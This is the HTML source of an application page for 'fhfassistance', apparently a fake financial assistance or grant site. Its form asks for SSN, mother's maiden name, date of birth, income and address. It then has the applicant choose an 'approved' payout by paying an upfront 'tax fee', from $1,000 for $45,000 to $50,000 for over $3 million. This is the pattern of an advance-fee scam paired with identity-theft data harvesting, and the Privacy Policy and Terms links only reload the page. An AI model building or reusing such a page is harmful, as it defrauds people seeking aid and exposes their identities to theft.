<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Apply - fhfassistance</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <header class="topbar">
    <div class="contact-sm">
      <span>Call: +1 (555) 123-4567</span>
      <span>Email: info@fhfassistance.org</span>
    </div>
    <nav class="main-nav">
  <a class="brand" href="index.html">fhfassistance</a>
      <ul>
        <li><a href="index.html">Home</a></li>
        <li><a href="about.html">About Us</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a class="btn-apply" href="apply.html">Apply Now</a></li>
      </ul>
    </nav>
  </header>

  <main class="container">
    <h1>Application Form</h1>

    <form id="applicationForm" novalidate>
      <div class="form-grid">
        <label>First name<input name="firstName" required aria-required="true" placeholder="First"></label>
        <label>Last name<input name="lastName" required aria-required="true" placeholder="Last"></label>

        <label>Mother First name<input name="motherFirst" required placeholder="Mother's first name"></label>
        <label>Mother Last name<input name="motherLast" required placeholder="Mother's last name"></label>

        <label class="full">Referral Name<input name="referralName" placeholder="Referral Full Name"></label>

        <label>Street Address<input name="street" required placeholder="123 Example St"></label>
        <label>City<input name="city" required></label>

        <label>State/Region<input name="state" required></label>
        <label>Postal / Zip Code<input name="postal" required></label>

        <label>Your E-mail<input name="email" type="email" required placeholder="you@example.com"></label>
        <label>Phone<input name="phone" type="tel" required placeholder="123-456-7890"></label>

        <label>Date Of Birth<input name="dob" type="date" required></label>
        <label>Occupation<input name="occupation" required></label>

        <label>Sex
          <select name="sex" required>
            <option value="">Choose...</option>
            <option>Female</option>
            <option>Male</option>
            <option>Other</option>
          </select>
        </label>

        <label>Monthly income<input name="income" required placeholder="Monthly income"></label>
        <label>SSN<input name="ssn" required placeholder="###-##-####"></label>

        <label class="full">You Are To Choose Below The Amount You Got Approved For And The Tax Fee
          <select name="amountApproved" required>
            <option value="">-Select-</option>
            <option value="1000">You pay $1,000 tax and get $45,000.00</option>
            <option value="3000">You pay $3,000 tax and get $120,000.00</option>
            <option value="5000">You pay $5,000 tax and get $200,800.00</option>
            <option value="7000">You pay $7,000 tax and get $300,000.00</option>
            <option value="8000">You pay $8,000 tax and get $350,800.00</option>
            <option value="8500">You pay $8,500 tax and get $400,070.00</option>
            <option value="9000">You pay $9,000 tax and get $450,000.00</option>
            <option value="10000">You pay $10,000 tax and get $500,800.00</option>
            <option value="12000">You pay $12,000 tax and get $600,000.00</option>
            <option value="15000">You pay $15,000 tax and get $709,000.00</option>
            <option value="20000">You pay $20,000 tax and get $870,700.00</option>
            <option value="25000">You pay $25,000 tax and get $1,008,000.00</option>
            <option value="50000">You pay $50,000 tax and get $3,080,200.00</option>
          </select>
        </label>


        <div class="full">
          <button type="submit">Submit Application</button>
        </div>
      </div>
    </form>

    <div id="appResult" class="result" aria-live="polite"></div>

  </main>

  <footer>
    <div class="footer-links">
      <a href="about.html">About Us</a>
      <a href="contact.html">Contact</a>
      <a href="#" onclick="location.reload()">Privacy Policy</a>
      <a href="#" onclick="location.reload()">Terms of Service</a>
    </div>
    <p>&copy; 2025 fhfassistance. All rights reserved.</p>
  </footer>

  <script src="js/main.js"></script>
</body>
</html>
